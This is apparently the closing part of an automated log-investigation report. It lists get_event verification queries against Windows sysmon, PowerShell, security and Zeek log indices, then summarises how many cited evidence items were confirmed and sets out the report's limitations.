| q-06937d6442 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-1ae76cad31 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-ec179866be | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-ccd4c2e7eb | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-5962ff51ab | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHW"} | None |  |
| q-fc48f4cd3e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None |  |
| q-0bac2744fc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoSVqPo"} | None |  |
| q-e1009efbb4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoQTo3z"} | None |  |
| q-6794d7819e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4z4i"} | None |  |
| q-08df7a9a37 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-7eccdeae0c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-0d8ab83798 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1qSj"} | None |  |
| q-a252bea1f8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnts2nD"} | None |  |
| q-6b51f00805 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoKOGL_"} | None |  |
| q-3c6d4e8df8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-359cd38c7c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi85CSh"} | None |  |
| q-0e05c3e4c3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-8c49a2fb16 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoqv86o"} | None |  |
| q-f9c1380c83 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7n"} | None |  |
| q-c5299c6d86 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8M"} | None |  |
| q-f20c96f955 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGh"} | None |  |
| q-63f2ca1ae3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoTWpZy"} | None |  |
| q-af4bd18c97 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-4a0af5abe8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-959fcf0c2b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-5f3b0bd58f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b5c3f7598d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-23e6e31d88 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy0A4uc"} | None |  |
| q-02eaf98b64 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy3EfF6"} | None |  |
| q-7ed863284c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-614275e1c7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-340de8fd4b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-e3b8f85e74 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppHD"} | None |  |
| q-54c1a263dc | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuitni7"} | None |  |
| q-9cd436bcda | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-7374098513 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-d0933dc264 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-6f6e65b82d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-50b6d9939b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-9ef286bc86 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-d6b650f1b8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-84865e08c4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-85a32bef5c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-e549b401e5 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-cf0f36af7a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-6909290c9d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-ec1820172d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-51745d4851 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-e383992223 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05D7L"} | None |  |
| q-1b49f35131 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoty_Kk"} | None |  |
| q-ca6c15c589 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSnoR"} | None |  |
| q-9829a9fa40 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-089c746fb0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-11697772a3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-88742dc38c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoGKqgM"} | None |  |
| q-387ddfb8c8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-0aec786ddc | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBufr2mI"} | None |  |
| q-0be5bde35b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz3z5O"} | None |  |
| q-48fd44334d | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh9E"} | None |  |
| q-bb0b9e9054 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8L"} | None |  |
| q-bad4224e32 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXG"} | None |  |
| q-cc6e44bd80 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_H"} | None |  |
| q-44ce3fe51f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByOkBkA"} | None |  |
| q-e2f54303d7 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGc"} | None |  |
| q-680baf336b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXo"} | None |  |
| q-d620fdb7c0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnIEszs"} | None |  |
| q-132265d44d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-24cd3b0f78 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-dc9fdb4aa6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-1945ebc39a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-600a6d970a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-6ed16e4635 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-46574c117b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-275e539aa3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-a2dafdbc0d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-785e65cc72 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-13043f01ff | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-a89cd79364 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-048d73b6b9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-d9cafd21c6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-51e93af813 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-2045b762ac | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-b358584be4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-d482c3f4f2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-786f6704da | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-8721d9cd65 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-537d2a4e83 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-433a6530ac | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-d849cfc8ad | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-d57b015b81 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-f5279e0976 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-f8b307270c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-fefc6e8049 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-0559f58b91 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-513246c040 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-03f0829dbc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05T5k"} | None |  |
| q-87835b9050 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-8c63a198d7 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-b5fa6c38a9 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0u"} | None |  |
| q-dfc245e702 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBunxq0T"} | None |  |
| q-82ba7971b9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-224f0da654 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWk9M"} | None |  |
| q-675216ce24 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None |  |
| q-e44dec8501 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSXoo"} | None |  |
| q-6bd29f0126 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-c235bf9b09 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3c20992f92 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-284b1e950b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-b7cea8fccc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-fc1a9ddf21 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXN"} | None |  |
| q-44cf550436 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNQ2BV"} | None |  |
| q-70811a3863 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-b8a7d7a0c1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-ced9ee1e27 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBogld9W"} | None |  |
| q-6e3326a094 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi74TK0"} | None |  |
| q-89dcd6b128 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQMVqo"} | None |  |
| q-1bb39d7963 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuy-fsg"} | None |  |
| q-6dbed44cfd | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr9"} | None |  |
| q-1b40711011 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYbCZ"} | None |  |
| q-4b7a9eb3d0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-4fc1effbf3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-9be0ad293a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None |  |
| q-278a125057 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4z4i"} | None |  |
| q-c73313db6f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l6o"} | None |  |
| q-3042add450 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByDVjze"} | None |  |
| q-454b90f53f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnnmUud"} | None |  |
| q-70d0d7553c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-d6d78142f1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-70e7917ab0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-b57ae913dd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-98c558cda9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLrb"} | None |  |
| q-761fcc9c91 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-296d0b8f45 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-5454bc4f8b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-7f415e2fb7 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-d87ddcb998 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBowNwU"} | ERROR |  |
| q-06234cdd6b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabod"} | None |  |
| q-2d64faa20a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBosxOR1"} | None |  |
| q-61aaca10fc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByYf10J"} | None |  |
| q-37c81206ab | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None |  |
| q-2ad27acd8c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwNwU"} | None |  |

## Verification

Evidence items cited: 247; confirmed against the stored events: 245; rejected: 2. Each item was re-fetched with get_event; it is confirmed only if the event exists, the cited field holds the cited value, and the cited query_id is a query of this run that returned that event.
Evidence sent back to the agents for correction during the run: 13 item(s) in 5 submission(s) (one correction round each; what still failed was rejected).

## Limitations

- Findings describe what the stored logs show; activity these sources did not log cannot be seen.
- Datasets with non-overlapping time windows (see Data examined) were analysed separately.
- Long field values are shortened in this report; full events are retrievable by _index/_id.
